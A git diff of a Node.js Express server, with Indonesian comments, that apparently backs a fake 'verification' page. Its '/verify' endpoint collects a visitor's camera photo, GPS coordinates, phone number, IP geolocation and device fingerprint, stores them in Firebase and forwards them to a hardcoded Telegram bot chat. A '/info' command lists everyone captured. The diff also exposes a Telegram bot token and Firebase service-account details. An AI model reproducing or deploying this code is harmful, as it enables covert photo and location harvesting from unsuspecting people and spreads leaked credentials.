@@ -7,10 +7,10 @@ const admin = require('firebase-admin');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ===== FIREBASE CONFIG =====
-// Service account key (copy paste dari file JSON Anda)
+// ============================================
+// 🔥 FIREBASE SERVICE ACCOUNT (BARU)
+// ============================================
 const serviceAccount = {
-  {
   "type": "service_account",
   "project_id": "nampung",
   "private_key_id": "23756c5a6da23e322e4bb09a48d7f2d02b8c2bcf",
@@ -22,20 +22,21 @@ const serviceAccount = {
   "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
   "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40nampung.iam.gserviceaccount.com",
   "universe_domain": "googleapis.com"
-  }
+};
 
-// ===== INIT FIREBASE =====
+// ============================================
+// 🔥 INIT FIREBASE
+// ============================================
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
   databaseURL: 'https://nampung-default-rtdb.asia-southeast1.firebasedatabase.app/'
 });
 
-const database = admin.database();
-const verifikasiRef = database.ref('verifikasi');
-
 console.log('🔥 Firebase connected successfully!');
 
-// ===== BOT CONFIG =====
+// ============================================
+// 🤖 TELEGRAM CONFIG
+// ============================================
 const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
 const CHAT_ID = '7352381955';
 
@@ -46,11 +47,19 @@ console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
 console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
 console.log('========================================');
 
+// ============================================
+// 📦 MIDDLEWARE
+// ============================================
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 
-// ===== GET GPS LOCATION =====
+const database = admin.database();
+const verifikasiRef = database.ref('verifikasi');
+
+// ============================================
+// 📍 GET LOCATION FROM IP
+// ============================================
 async function getLocationDetails(ip) {
   try {
     const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
@@ -70,7 +79,6 @@ async function getLocationDetails(ip) {
         latitude: data.lat || 0,
         longitude: data.lon || 0,
         timezone: data.timezone || '-',
-        isp: data.isp || '-',
         provider: data.isp ? data.isp.replace('PT ', '') : '-',
         isMobile: data.mobile || false,
         fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
@@ -84,7 +92,9 @@ async function getLocationDetails(ip) {
   }
 }
 
-// ===== DETECT DEVICE =====
+// ============================================
+// 📱 DETECT DEVICE
+// ============================================
 function detectDevice(userAgent) {
   if (!userAgent) return { browser: 'Tidak diketahui', os: 'Tidak diketahui', device: 'Tidak diketahui', brand: 'Tidak diketahui', model: 'Tidak diketahui' };
   
@@ -97,13 +107,11 @@ function detectDevice(userAgent) {
     model: 'Tidak diketahui'
   };
 
-  // Browser
   if (ua.includes('chrome')) info.browser = 'Chrome';
   else if (ua.includes('firefox')) info.browser = 'Firefox';
   else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
   else if (ua.includes('edge')) info.browser = 'Edge';
 
-  // OS
   if (ua.includes('android')) {
     info.os = 'Android';
     const match = ua.match(/android\s([\d.]+)/);
@@ -118,7 +126,6 @@ function detectDevice(userAgent) {
     info.os = 'macOS';
   }
 
-  // Device Type
   if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
     info.device = 'Mobile';
   } else if (ua.includes('tablet') || ua.includes('ipad')) {
@@ -127,7 +134,6 @@ function detectDevice(userAgent) {
     info.device = 'Desktop';
   }
 
-  // Brand
   const brands = [
     { name: 'Samsung', patterns: ['samsung', 'sm-'] },
     { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
@@ -147,7 +153,6 @@ function detectDevice(userAgent) {
     }
   }
 
-  // Model
   if (info.brand === 'Apple') {
     const match = ua.match(/iphone(\d+)/);
     if (match) info.model = `iPhone ${match[1]}`;
@@ -159,7 +164,9 @@ function detectDevice(userAgent) {
   return info;
 }
 
-// ===== SEND TO TELEGRAM =====
+// ============================================
+// 📤 SEND TO TELEGRAM
+// ============================================
 async function sendToTelegram(photoBuffer, data) {
   try {
     const { device, gps, locationData, ip, timestamp, phone } = data;
@@ -169,7 +176,6 @@ async function sendToTelegram(photoBuffer, data) {
     caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
     caption += `🕒 *Waktu:* ${time}\n\n`;
     
-    // Device Info
     if (device) {
       caption += `📱 *Device Info:*\n`;
       caption += `   🏷️ Brand: ${device.brand || 'Tidak diketahui'}\n`;
@@ -181,22 +187,18 @@ async function sendToTelegram(photoBuffer, data) {
       caption += `   🌐 Browser: ${device.browser || 'Tidak diketahui'}\n\n`;
     }
     
-    // Location
     if (locationData) {
       caption += `📍 *Lokasi:*\n`;
       caption += `   🏙️ ${locationData.fullLocation}\n`;
       caption += `   📮 Zip: ${locationData.zip}\n`;
       caption += `   🌐 Timezone: ${locationData.timezone}\n`;
       caption += `   📡 Provider: ${locationData.provider}\n\n`;
-      
       caption += `🗺️ *Google Maps:*\n`;
       caption += `${locationData.googleMapsLink}\n\n`;
-      
       caption += `📊 *Koordinat:*\n`;
       caption += `   ${locationData.latitude}, ${locationData.longitude}\n\n`;
     }
     
-    // GPS
     if (gps) {
       caption += `📍 *GPS:*\n`;
       caption += `   ${gps.latitude}, ${gps.longitude}\n`;
@@ -222,7 +224,6 @@ async function sendToTelegram(photoBuffer, data) {
     const tgData = await tgResponse.json();
     console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
     
-    // Kirim lokasi
     if (gps) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
         method: 'POST',
@@ -242,7 +243,9 @@ async function sendToTelegram(photoBuffer, data) {
   }
 }
 
-// ===== WEBHOOK BOT =====
+// ============================================
+// 📨 WEBHOOK BOT
+// ============================================
 app.post('/webhook', async (req, res) => {
   try {
     const { message } = req.body;
@@ -250,8 +253,6 @@ app.post('/webhook', async (req, res) => {
     
     if (message && message.text === '/info') {
       const chatId = message.chat.id;
-      
-      // Ambil data dari Firebase
       const snapshot = await verifikasiRef.once('value');
       const allData = snapshot.val();
       
@@ -276,7 +277,6 @@ app.post('/webhook', async (req, res) => {
         response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
         response += `   🕒 ${user.timestamp || '-'}\n`;
         response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
-        response += `   📱 ${user.device || 'Tidak diketahui'}\n`;
         if (index < lastIndex) response += `\n`;
       });
       
@@ -298,7 +298,9 @@ app.post('/webhook', async (req, res) => {
   }
 });
 
-// ===== VERIFY ENDPOINT =====
+// ============================================
+// ✅ VERIFY ENDPOINT
+// ============================================
 app.post('/verify', async (req, res) => {
   console.log('📸 ===== NEW VERIFICATION =====');
   console.log('📸 Time:', new Date().toISOString());
@@ -315,18 +317,13 @@ app.post('/verify', async (req, res) => {
       return res.json({ success: false, error: 'No image' });
     }
     
-    // Get location from IP
     const locationData = await getLocationDetails(ip);
-    
-    // Detect device from user agent
     const deviceData = detectDevice(userAgent);
     
-    // Process image
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
     console.log(`📸 Image size: ${buffer.length} bytes`);
     
-    // Prepare data for Firebase
     const userData = {
       phone: phone || `User_${Date.now().toString().slice(-6)}`,
       timestamp: new Date(timestamp || Date.now()).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
@@ -337,18 +334,14 @@ app.post('/verify', async (req, res) => {
       longitude: gps ? gps.longitude : (locationData ? locationData.longitude : 0),
       provider: locationData ? locationData.provider : '-',
       os: deviceData ? deviceData.os : '-',
-      browser: deviceData ? deviceData.browser : '-',
-      gpsAccuracy: gps ? gps.accuracy : null,
-      locationFromIP: locationData ? locationData.fullLocation : null
+      browser: deviceData ? deviceData.browser : '-'
     };
     
-    // SAVE TO FIREBASE
     console.log('💾 Saving to Firebase...');
     const newUserRef = verifikasiRef.push();
     await newUserRef.set(userData);
     console.log(`✅ Saved to Firebase with key: ${newUserRef.key}`);
     
-    // SEND TO TELEGRAM
     const result = await sendToTelegram(buffer, {
       device: deviceData,
       gps: gps,
@@ -372,7 +365,9 @@ app.post('/verify', async (req, res) => {
   }
 });
 
-// ===== TEST ENDPOINTS =====
+// ============================================
+// 🧪 TEST ENDPOINTS
+// ============================================
 app.get('/test', async (req, res) => {
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
@@ -413,8 +408,14 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// ============================================
+// 🚀 START SERVER
+// ============================================
 app.listen(PORT, '0.0.0.0', () => {
   console.log('========================================');
   console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📊 Test bot: /test`);
+  console.log(`📊 Test send: /send`);
+  console.log(`📊 View data: /data`);
   console.log('========================================');
 });
